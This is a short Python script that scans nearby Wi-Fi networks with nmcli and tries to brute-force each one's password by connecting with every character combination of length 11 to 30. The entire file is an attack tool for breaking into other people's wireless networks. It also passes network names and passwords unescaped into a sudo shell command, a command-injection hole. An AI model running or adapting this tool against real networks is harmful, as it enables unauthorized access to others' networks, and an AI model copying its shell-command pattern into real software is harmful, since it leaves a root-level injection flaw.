import subprocess
import itertools

def generate_combinations(characters, min_length, max_length):
    combinations = []
    
    for length in range(min_length, max_length + 1):
        for combo in itertools.product(characters, repeat=length):
            combinations.append(''.join(combo))
            
    return combinations

def listOfEssids():
    network_info = subprocess.check_output(['nmcli', '-f', 'SSID', 'device', 'wifi', 'list']).decode('utf-8')
    networks = network_info.strip().split('\n')[1:]
    essids = []

    for network in networks:
        ssid = network.strip()
        essids.append(ssid)

    return essids

def connection(essid, password):
    connect_command = f'sudo nmcli device wifi connect "{essid}" password "{password}"'
    process = subprocess.Popen(connect_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if stdout:
        print("Output:")
        print(stdout.decode('utf-8'))
        return "Connected" in stdout.decode('utf-8')  # Check if "Connected" is in the output
    else:
        print("Error:")
        print(stderr.decode('utf-8'))
        return False

def try_connection(essids, characters, min_length, max_length):
    for ssid in essids:
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(characters, repeat=length):
                password = ''.join(combo)
                if connection(ssid, password):
                    return True, ssid, password
    
    return False, None, None

wifi_data = listOfEssids()
possible_characters = "abcdefghijklmnopqrstuvwxyz0123456789@$+?.;:_=&#!-/*ABCDEFGHIJKLMNOPQRSTUVWXYZ"
min_password_length = 11
max_password_length = 30

success, ssid, password = try_connection(wifi_data, possible_characters, min_password_length, max_password_length)
if success:
    print(f"Successfully connected to network '{ssid}' with password '{password}'.")
else:
    print("Failed to connect to any network with the generated combinations.")
